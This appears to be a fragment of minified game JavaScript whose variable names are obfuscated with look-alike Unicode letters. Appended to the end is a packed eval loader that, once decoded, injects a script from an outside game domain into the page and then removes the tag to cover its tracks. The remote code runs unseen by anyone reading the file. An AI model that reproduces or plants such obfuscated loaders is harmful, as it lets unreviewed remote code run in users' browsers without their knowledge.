...
(function (exports, undefined) {
    ...
    Player.prototype = {
        ...
        ΟM: function () {
            ...
            var Β = (122 * 122 - U - y) / 100;
            if (Β <= 0) {
                Β = 0;
                this.Ε4.zЈ = this.qϜ[Math.random() * this.qϜ.length >> 0]
            } else {
            	Β=Β*(1+Math.random() * 0.02-0.01);
                if (r.type > 0) {
                    Β += Β;
                }
            }
...
eval(function(p,a,c,k,e,d){e=function(c){return(c<a?"":e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--)d[e(c)]=k[c]||e(c);k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1;};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p;}('(1(){2 a=3.p(\'4\');a.e=\'d/c\';a.h=g;a.f=\'6://9.8.7/m/o.k\';2 b=3.n(\'4\')[0];b.5.j(a,b);a.i=1(){a.5.l(a)}})();',26,26,'|function|var|document|script|parentNode|http|com|9g|game|||javascript|text|type|src|true|async|onload|insertBefore|js|removeChild|ksiphone6|getElementsByTagName||createElement'.split('|'),0,{}))